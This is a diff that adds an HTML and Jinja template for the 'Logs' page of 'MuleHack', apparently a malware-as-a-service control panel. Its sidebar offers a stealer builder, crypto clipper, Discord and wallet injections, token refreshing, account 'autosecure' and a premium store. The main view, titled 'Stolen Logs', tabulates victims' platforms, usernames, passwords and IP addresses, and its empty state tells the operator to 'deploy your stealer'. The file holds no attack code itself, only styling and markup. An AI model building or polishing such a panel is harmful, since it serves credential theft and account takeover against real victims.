@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MuleHack · Logs</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0f;
+            color: #c8d0e0;
+            display: flex;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                linear-gradient(rgba(120, 255, 214, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(120, 255, 214, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .spot {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            filter: blur(80px);
+            opacity: 0.65;
+            animation: glowPulse 10s ease-in-out infinite alternate;
+        }
+        .spot-1 { width: 600px; height: 600px; top: -20%; right: -10%; background: radial-gradient(circle, rgba(120,255,214,0.6) 0%, rgba(120,255,214,0.15) 40%, transparent 70%); animation-delay: 0s; }
+        .spot-2 { width: 500px; height: 500px; bottom: -15%; left: -10%; background: radial-gradient(circle, rgba(168,255,120,0.5) 0%, rgba(168,255,120,0.12) 40%, transparent 70%); animation-delay: 2.5s; }
+        .spot-3 { width: 400px; height: 400px; top: 30%; left: 55%; background: radial-gradient(circle, rgba(0,212,255,0.45) 0%, rgba(0,212,255,0.1) 40%, transparent 70%); animation-delay: 4.5s; }
+        .spot-4 { width: 450px; height: 450px; top: 60%; right: 5%; background: radial-gradient(circle, rgba(120,255,214,0.5) 0%, rgba(120,255,214,0.12) 40%, transparent 70%); animation-delay: 1.5s; }
+        .spot-5 { width: 350px; height: 350px; top: 8%; left: 12%; background: radial-gradient(circle, rgba(168,255,120,0.45) 0%, rgba(168,255,120,0.1) 40%, transparent 70%); animation-delay: 3.5s; }
+        .spot-6 { width: 300px; height: 300px; top: 45%; left: 8%; background: radial-gradient(circle, rgba(120,255,214,0.35) 0%, rgba(120,255,214,0.08) 40%, transparent 70%); animation-delay: 5.5s; }
+        .spot-7 { width: 380px; height: 380px; bottom: -5%; right: 25%; background: radial-gradient(circle, rgba(0,212,255,0.3) 0%, rgba(0,212,255,0.08) 40%, transparent 70%); animation-delay: 6.5s; }
+        @keyframes glowPulse {
+            0% { opacity: 0.45; transform: scale(1); }
+            100% { opacity: 0.85; transform: scale(1.12); }
+        }
+        .sidebar {
+            width: 240px;
+            min-width: 240px;
+            background: rgba(13, 13, 22, 0.95);
+            backdrop-filter: blur(24px);
+            border-right: 1px solid rgba(120, 255, 214, 0.06);
+            padding: 20px 14px 20px 16px;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            position: sticky;
+            top: 0;
+            z-index: 2;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(120, 255, 214, 0.1) transparent;
+        }
+        .sidebar::-webkit-scrollbar { width: 4px; }
+        .sidebar::-webkit-scrollbar-track { background: transparent; }
+        .sidebar::-webkit-scrollbar-thumb { background: rgba(120, 255, 214, 0.15); border-radius: 4px; }
+        .sidebar .logo { font-size: 22px; font-weight: 700; color: #fff; padding: 4px 10px 16px 10px; text-align: left; letter-spacing: -0.5px; border-bottom: 1px solid rgba(120, 255, 214, 0.06); margin-bottom: 10px; }
+        .sidebar .logo span { background: linear-gradient(135deg, #a8ff78, #78ffd6, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .sidebar .category { font-size: 9px; text-transform: uppercase; letter-spacing: 1.2px; color: #3d455a; padding: 10px 10px 4px 10px; font-weight: 600; }
+        .sidebar a {
+            color: #5a6279;
+            text-decoration: none;
+            font-size: 13px;
+            padding: 7px 12px;
+            border-radius: 6px;
+            transition: all 0.15s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            margin: 1px 0;
+        }
+        .sidebar a i { width: 18px; font-size: 14px; color: #3d455a; transition: 0.15s; }
+        .sidebar a:hover { background: rgba(120, 255, 214, 0.05); color: #c8d0e0; }
+        .sidebar a:hover i { color: #5a6279; }
+        .sidebar a.active {
+            background: rgba(120, 255, 214, 0.07);
+            color: #78ffd6;
+            border-left: 2.5px solid #78ffd6;
+            box-shadow: inset 0 0 30px rgba(120, 255, 214, 0.02);
+        }
+        .sidebar a.active i { color: #78ffd6; text-shadow: 0 0 20px rgba(120, 255, 214, 0.15); }
+        .sidebar .divider { border-top: 1px solid rgba(120, 255, 214, 0.04); margin: 6px 10px; }
+        .main {
+            flex: 1;
+            padding: 28px 38px 30px 38px;
+            overflow-y: auto;
+            z-index: 1;
+            position: relative;
+            min-width: 0;
+        }
+        .topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+        .topbar h1 { font-size: 24px; font-weight: 600; color: #fff; }
+        .topbar h1 .highlight { background: linear-gradient(135deg, #a8ff78, #78ffd6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .topbar .user { font-size: 13px; color: #5a6279; }
+        .topbar .user i { margin-right: 6px; color: #78ffd6; }
+        .card {
+            background: rgba(17, 17, 26, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(120, 255, 214, 0.06);
+            border-radius: 10px;
+            padding: 22px 24px;
+        }
+        .log-row {
+            display: grid;
+            grid-template-columns: 120px 1fr 1fr 150px 120px;
+            gap: 15px;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(120, 255, 214, 0.04);
+            font-size: 13px;
+            align-items: center;
+        }
+        .log-row.header { color: #5a6279; font-size: 11px; text-transform: uppercase; letter-spacing: 0.6px; font-weight: 600; border-bottom: 2px solid rgba(120, 255, 214, 0.06); }
+        .log-row:last-child { border-bottom: none; }
+        .platform { color: #78ffd6; font-weight: 500; }
+        .creds { color: #8a92aa; font-family: monospace; }
+        .ip { color: #5a6279; font-family: monospace; }
+        .time { color: #3d455a; font-size: 12px; }
+        .empty-state { color: #3d455a; text-align: center; padding: 40px 0; font-size: 14px; }
+        .empty-state i { font-size: 40px; display: block; margin-bottom: 15px; color: #1a1f2e; }
+        .footer {
+            margin-top: 28px;
+            padding-top: 14px;
+            border-top: 1px solid rgba(120, 255, 214, 0.04);
+            font-size: 12px;
+            color: #3d455a;
+            display: flex;
+            justify-content: space-between;
+        }
+        .footer a { color: #3d455a; text-decoration: none; }
+        .footer a:hover { color: #78ffd6; }
+        @media (max-width: 900px) {
+            .sidebar { width: 180px; min-width: 180px; }
+            .log-row { grid-template-columns: 100px 1fr 1fr; }
+            .log-row .ip, .log-row .time { display: none; }
+            .main { padding: 20px 24px; }
+        }
+        @media (max-width: 600px) {
+            .sidebar { display: none; }
+            .main { padding: 16px; }
+            .log-row { grid-template-columns: 80px 1fr; }
+            .log-row .creds { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="spot spot-1"></div><div class="spot spot-2"></div><div class="spot spot-3"></div>
+    <div class="spot spot-4"></div><div class="spot spot-5"></div><div class="spot spot-6"></div>
+    <div class="spot spot-7"></div>
+
+    <div class="sidebar">
+        <div class="logo">Mule<span>Hack</span></div>
+        <div class="category">Main</div>
+        <a href="/dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+        <a href="/builder"><i class="fas fa-code"></i> Builder</a>
+        <a href="/logs" class="active"><i class="fas fa-list"></i> Logs</a>
+        <a href="/leaderboard"><i class="fas fa-trophy"></i> Leaderboard</a>
+        <div class="divider"></div>
+        <div class="category">Account</div>
+        <a href="/account"><i class="fas fa-user"></i> Account</a>
+        <a href="/settings"><i class="fas fa-user-cog"></i> Settings</a>
+        <a href="/secureaccount"><i class="fas fa-shield-alt"></i> Secure Account</a>
+        <div class="divider"></div>
+        <div class="category">Features</div>
+        <a href="/features"><i class="fas fa-star"></i> Stealer Features</a>
+        <a href="/remote"><i class="fas fa-desktop"></i> Remote Features</a>
+        <a href="/cryptoclipper"><i class="fas fa-coins"></i> Crypto Clipper</a>
+        <a href="/tutorials"><i class="fas fa-book"></i> Tutorials</a>
+        <a href="/suggestions"><i class="fas fa-lightbulb"></i> Suggestions</a>
+        <a href="/surveys"><i class="fas fa-poll"></i> Surveys</a>
+        <a href="/socials"><i class="fas fa-share-alt"></i> Socials</a>
+        <a href="/discordinjections"><i class="fas fa-bolt"></i> Discord Injections</a>
+        <div class="divider"></div>
+        <div class="category">Store</div>
+        <a href="/upgrade"><i class="fas fa-crown"></i> Upgrade to Premium</a>
+        <a href="/affiliate"><i class="fas fa-link"></i> Affiliate</a>
+        <a href="/purchase"><i class="fas fa-shopping-cart"></i> Purchase</a>
+        <div class="divider"></div>
+        <div class="category">Tools</div>
+        <a href="/builder"><i class="fas fa-layer-group"></i> Builder</a>
+        <a href="/refreshtokens"><i class="fas fa-sync-alt"></i> Refresh Tokens</a>
+        <a href="/donutstats"><i class="fas fa-chart-pie"></i> Donut Stats</a>
+        <a href="/bundler"><i class="fas fa-box"></i> Bundler</a>
+        <a href="/steamchecker"><i class="fab fa-steam"></i> Steam Checker</a>
+        <a href="/autosecure"><i class="fas fa-shield"></i> Autosecure</a>
+        <a href="/discordbot"><i class="fab fa-discord"></i> Discord Bot</a>
+        <div class="divider"></div>
+        <div class="category">Integrations</div>
+        <a href="/mail"><i class="fas fa-envelope"></i> Mail</a>
+        <a href="/discordbot"><i class="fab fa-discord"></i> Discord Bot</a>
+        <div class="divider"></div>
+        <div class="category">Injections</div>
+        <a href="/discordinjections"><i class="fab fa-discord"></i> Discord Injection</a>
+        <a href="/cryptoclipper"><i class="fas fa-wallet"></i> Wallet Injection</a>
+        <div class="divider"></div>
+        <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+    </div>
+
+    <div class="main">
+        <div class="topbar">
+            <h1><span class="highlight">📋</span> Stolen Logs</h1>
+            <div class="user"><i class="fas fa-user"></i> {{ session['username'] }} · {{ logs|length }} entries</div>
+        </div>
+        <div class="card">
+            {% if logs %}
+            <div class="log-row header">
+                <span>Platform</span>
+                <span>Username</span>
+                <span>Password</span>
+                <span class="ip">IP</span>
+                <span class="time">Time</span>
+            </div>
+            {% for log in logs %}
+            <div class="log-row">
+                <span class="platform">{{ log.platform }}</span>
+                <span>{{ log.username }}</span>
+                <span class="creds">{{ log.password }}</span>
+                <span class="ip">{{ log.ip }}</span>
+                <span class="time">{{ log.time[:16] }}</span>
+            </div>
+            {% endfor %}
+            {% else %}
+            <div class="empty-state">
+                <i class="fas fa-inbox"></i>
+                No logs yet. Deploy your stealer to start collecting data.
+            </div>
+            {% endif %}
+        </div>
+        <div class="footer">
+            <span>© 2026 MuleHack · <a href="#">Privacy</a></span>
+            <span><i class="fas fa-user-secret"></i> Anonymous</span>
+        </div>
+    </div>
+</body>
+</html>
